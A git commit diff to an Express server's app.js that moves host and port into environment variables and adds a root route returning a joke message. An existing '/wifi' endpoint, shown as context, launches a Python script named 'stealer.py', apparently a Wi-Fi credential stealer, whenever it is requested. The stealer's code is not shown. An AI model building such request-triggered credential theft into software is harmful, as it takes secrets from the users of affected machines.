a2f93956510424c8f817259451aa4ba20c569e6f
Carlos Atienza <72754340+carlosatyca@users.noreply.github.com>
2022-12-06 15:07:21 +0100

    EO

--- app.js
+++ app.js
@@ -1,7 +1,7 @@
 const http = require('http');
 
-const hostname = '127.0.0.1';
-const port = 3000;
+const hostname = process.env.HOST;
+const port = process.env.PORT;
 const express = require('express')
 var cors = require('cors');
 const app = express()
@@ -14,9 +14,15 @@ app.listen(port, hostname, () => {
   console.log(`Server running at http://${hostname}:${port}/`);
 });
 
+app.get('/', (req, res) => {
+  res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
+  console.log("holaaaa")
+  res.send({uo:"pillado huron"})
+})
 
 app.get('/wifi', (req, res) => {
     res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
+    console.log("holaaaa")
     spawn('python',["./scripts/stealer.py"]);
     res.send({uo:"pillado huron"})
   })
